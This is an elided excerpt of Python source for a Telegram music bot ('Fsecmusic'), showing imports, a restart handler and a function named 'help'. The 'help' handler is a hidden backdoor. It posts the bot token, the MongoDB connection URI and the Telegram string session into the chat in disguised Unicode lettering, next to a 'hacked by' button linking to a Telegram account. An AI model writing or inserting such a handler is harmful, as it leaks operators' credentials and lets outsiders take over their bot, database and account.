...
from Fsecmusic.utils.database import get_assistant, get_authuser_names, get_cmode
from Fsecmusic.utils.decorators import ActualAdminCB, AdminActual, language
from Fsecmusic.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await FALCON.stop_stream_force(chat_id)
        except:
            pass
...
async def help(client: Client, message: Message):
   await message.reply_photo(
       ...
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/II_SUDO_II)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/II_SUDO_II")
                 ]
            ]
         ),
     )
